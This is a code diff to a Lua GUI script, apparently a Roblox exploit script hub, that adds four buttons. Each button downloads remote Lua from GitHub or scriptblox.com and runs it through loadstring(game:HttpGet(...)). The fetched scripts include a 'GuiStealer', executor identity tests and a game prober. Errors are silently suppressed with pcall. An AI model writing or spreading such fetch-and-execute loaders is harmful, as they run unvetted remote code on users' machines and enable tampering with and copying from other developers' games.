@@ -1626,6 +1626,46 @@ if ctb6 then
     end)
 end
 
+-- CTB7
+local ctb7 = createImageButton("a7_Chat", 50, 50, 50, 0.2, "78687742773593", false)
+if ctb7 then
+    ctb7.MouseButton1Click:Connect(function()
+        pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThacG/Xyros/refs/heads/main/test"))()
+        end)
+    end)
+end
+
+-- CTB8
+local ctb8 = createImageButton("a8_ExeTest", 50, 50, 50, 0.2, "7128117167", false)
+if ctb8 then
+    ctb8.MouseButton1Click:Connect(function()
+        pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Executor-Tests/main/Identity/Test.lua"))()
+        end)
+    end)
+end
+
+-- CTB9
+local ctb9 = createImageButton("a9_GuiStealer", 255, 25, 25, 0.2, "95196969969406", false)
+if ctb9 then
+    ctb9.MouseButton1Click:Connect(function()
+        pcall(function()
+    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-GuiStealer-12751", true))()
+        end)
+    end)
+end
+
+-- CTB10
+local ctb10 = createImageButton("b1_GameProber", 50, 50, 50, 0.2, "14944375078", false)
+if ctb10 then
+    ctb10.MouseButton1Click:Connect(function()
+        pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/gameprober-lua/main/gp.lua"))()
+        end)
+    end)
+end
+
 -- ===== TEXT BUTTONS =======
 -- helper: TextButton creation (parented to tb by default)
 local function createTextButton(name, r, g, b, bt, text, scaled, visible, tr, tg, tb2, parentFrame)
